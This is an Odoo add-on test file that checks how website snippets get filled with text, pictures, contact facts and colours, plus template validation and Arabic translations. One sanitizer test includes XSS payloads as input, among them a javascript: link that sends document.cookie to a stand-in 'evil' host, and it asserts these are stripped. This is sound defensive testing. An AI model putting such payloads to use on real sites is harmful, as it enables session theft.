import io

from lxml import html as lxml_html

from odoo.tests import TransactionCase, tagged

from odoo.addons.nudge_builder.tools import compat, library, pictures, preview, schema, snippets


@tagged("post_install", "-at_install")
class TestSnippets(TransactionCase):
    """Odoo's own snippets, filled with words and a picture"""

    def section(self, key):
        return compat.parse_section(compat.render_snippet(self.env, key))

    def test_features_take_as_many_items_as_given(self):
        section = self.section("s_features")
        snippets.fill(section, "s_features", {"title": "Why us", "text": "Three reasons.", "items": [
            {"title": f"Reason {i}", "text": f"Text {i}"} for i in range(5)]})
        headings = [h.text for h in section.xpath(".//h3")[1:]]
        self.assertEqual(headings, [f"Reason {i}" for i in range(5)])
        self.assertEqual(section.xpath(".//h3")[0].text, "Why us")
        self.assertEqual(section.xpath(".//p[contains(@class,'lead')]")[0].text, "Three reasons.")

    def test_a_provider_cannot_carry_a_script_a_directive_or_a_bad_link_into_a_section(self):
        section = self.section("s_cover")
        snippets.fill(section, "s_cover", {
            "title": "Welcome <script>alert(1)</script>{{ 7*7 }}", "text": '<img src=x onerror="alert(1)">Hi t-esc="x"',
            "button": "Go", "button_url": "javascript:fetch('//evil/'+document.cookie)"})
        out = lxml_html.tostring(section).decode()
        for bad in ("<script", "onerror", "{{", "javascript:", 't-esc="'):
            self.assertNotIn(bad, out)
        self.assertEqual(section.xpath(".//a[contains(@class,'btn')]")[0].get("href"), "/contactus")
        section = self.section("s_cover")
        snippets.fill(section, "s_cover", {"button": "Go", "button_url": "https://example.com/a?b=1"})
        self.assertEqual(section.xpath(".//a[contains(@class,'btn')]")[0].get("href"), "https://example.com/a?b=1")

    def test_only_plain_links_pass_and_a_template_with_a_javascript_link_is_refused(self):
        from odoo.addons.nudge_builder.tools import safe
        with self.assertRaises(ValueError):
            schema._check_copy({"en": {"button_url": "javascript:alert(1)"}}, "p")
        self.assertEqual(safe.safe_url("javascript:alert(1)"), "")
        self.assertEqual(safe.safe_url(" JaVaScRiPt:alert(1)"), "")
        self.assertEqual(safe.safe_url("//evil.example/x"), "")
        for ok in ("/contactus", "https://a.example/x", "mailto:a@b.example", "tel:+971 50 123 4567", "#top"):
            self.assertEqual(safe.safe_url(ok), ok)

    def test_features_drop_the_items_that_are_not_given(self):
        section = self.section("s_features")
        snippets.fill(section, "s_features", {"items": [{"title": "Only", "text": "One"}]})
        self.assertEqual([h.text for h in section.xpath(".//h3")[1:]], ["Only"])

    def test_numbers_and_team_and_faq(self):
        numbers = self.section("s_numbers")
        snippets.fill(numbers, "s_numbers", {"items": [{"number": "10+", "label": "Years"}, {"number": "5", "label": "Cities"}]})
        self.assertEqual([n.text for n in numbers.xpath(".//span[contains(@class,'s_number')]")], ["10+", "5"])
        team = self.section("s_company_team")
        snippets.fill(team, "s_company_team", {"items": [{"title": "Raghad", "role": "Manager", "text": "Leads."}]})
        self.assertEqual(team.xpath(".//h4")[0].text, "Raghad")
        self.assertEqual(len(team.xpath(".//div[@data-name='Team Member']")), 1)
        faq = self.section("s_faq_collapse")
        snippets.fill(faq, "s_faq_collapse", {"items": [
            {"question": f"Q{i}?", "answer": f"Line one {i}\nLine two {i}"} for i in range(5)]})
        ids = faq.xpath(".//div[contains(@class,'accordion-collapse')]/@id")
        self.assertEqual(len(ids), 5)
        self.assertEqual(len(set(ids)), 5, "two answers must not share an id")
        targets = faq.xpath(".//button/@data-bs-target")
        self.assertEqual(targets, [f"#{i}" for i in ids])
        self.assertEqual(len(faq.xpath(".//div[contains(@class,'accordion-body')]")[0].xpath("p")), 2)

    def test_contact_and_map_take_the_company_facts(self):
        facts = {"phone": "+971 4 000 0000", "email": "info@raghad.example", "address": "Dubai, UAE"}
        contact = self.section("s_contact_info")
        snippets.fill(contact, "s_contact_info", {"title": "Contact"}, facts=facts)
        self.assertIn("mailto:info@raghad.example", contact.xpath(".//a/@href"))
        self.assertIn("tel:+97140000000", contact.xpath(".//a/@href"))
        self.assertIn("Dubai, UAE", contact.text_content())
        place = self.section("s_map")
        snippets.fill(place, "s_map", {}, facts=facts)
        self.assertIn("Dubai", place.xpath(".//iframe/@src")[0])

    def test_picture_goes_where_the_snippet_shows_its_main_one(self):
        cover = self.section("s_cover")
        snippets.fill(cover, "s_cover", {"title": "x"}, picture_url="/web/image/77")
        self.assertIn("/web/image/77", cover.xpath(".//span[contains(@class,'s_parallax_bg')]/@style")[0])
        side = self.section("s_text_image")
        snippets.fill(side, "s_text_image", {"title": "x"}, picture_url="/web/image/78")
        self.assertEqual(side.xpath(".//img/@src"), ["/web/image/78"])

    def test_a_block_without_heading_loses_the_samples(self):
        block = self.section("s_text_block")
        snippets.fill(block, "s_text_block", {"title": "", "text": "One.\nTwo."})
        self.assertFalse(block.xpath(".//h1|.//h2"))

    def test_text_is_text_not_markup(self):
        section = self.section("s_features")
        snippets.fill(section, "s_features", {"title": "Hello <script>alert(1)</script>"})
        self.assertFalse(section.xpath(".//script"))
        self.assertEqual(section.xpath(".//h2|.//h3")[0].text.strip(), "Hello")


@tagged("post_install", "-at_install")
class TestSchemaAndLibrary(TransactionCase):
    def test_the_generic_template_is_valid(self):
        self.assertEqual(library.load("generic")["key"], "generic")

    def test_a_fault_names_its_place(self):
        template = library.load("generic")
        template["pages"][0]["blocks"][0]["copy"] = {"ar": {"title": "x"}}
        with self.assertRaisesRegex(ValueError, r"\$\.pages\[0\]\.blocks\[0\]\.copy"):
            schema.validate_template(template)
        template = library.load("generic")
        template["palette"]["primary"] = "blue"
        with self.assertRaisesRegex(ValueError, r"palette\.primary"):
            schema.validate_template(template)
        template = library.load("generic")
        template["menu"] = ["nowhere"]
        with self.assertRaisesRegex(ValueError, r"\$\.menu"):
            schema.validate_template(template)

    def test_every_placeholder_exists_and_is_a_picture(self):
        from PIL import Image
        for key in schema.PLACEHOLDERS:
            with Image.open(io.BytesIO(pictures.placeholder_bytes(key))) as picture:
                self.assertEqual(picture.size, (1600, 900), key)

    def test_a_template_is_picked_by_its_words_in_any_language(self):
        self.assertEqual(library.pick(""), "generic")
        self.assertEqual(library.pick("a small company"), "generic")

    def test_logo_colours(self):
        from PIL import Image
        image = Image.new("RGB", (60, 60), (255, 255, 255))
        for x in range(60):
            for y in range(30):
                image.putpixel((x, y), (200, 30, 40))
            for y in range(40, 60):
                image.putpixel((x, y), (20, 90, 200))
        buffer = io.BytesIO()
        image.save(buffer, "PNG")
        colors = pictures.dominant_colors(buffer.getvalue())
        self.assertEqual(len(colors), 2, "white is not a brand colour")
        palette = pictures.palette_from(colors)
        self.assertEqual(palette["primary"], colors[0])
        for value in palette.values():
            self.assertRegex(value, r"^#[0-9a-f]{6}$")
        self.assertEqual(pictures.dominant_colors(b"not a picture"), [])

    def test_three_directions_differ(self):
        palette = pictures.DEFAULT_PALETTE
        directions = preview.derive_directions(palette, {"heading": "Cairo", "body": "Cairo"}, arabic=True)
        self.assertEqual([d["key"] for d in directions], ["a", "b", "c"])
        self.assertEqual(len({d["palette"]["primary"] for d in directions}), 3)
        self.assertTrue(all(d["fonts"]["heading"] in {"Cairo", "Tajawal", "Almarai"} for d in directions))
        document = preview.card_document(directions[0], "Title <i>x</i>", "Text", "Go", ["One", "Two"])
        tree = lxml_html.fromstring(document)
        self.assertFalse(tree.xpath("//i"), "the title is text, not markup")


@tagged("post_install", "-at_install")
class TestArabic(TransactionCase):
    def test_every_string_has_an_arabic_translation(self):
        from babel.messages.pofile import read_po
        from odoo.tools.misc import file_path
        with open(file_path("nudge_builder/i18n/ar.po"), "rb") as handle:
            catalog = read_po(handle)
        missing = [message.id for message in catalog if message.id and not message.string]
        self.assertEqual(missing, [])
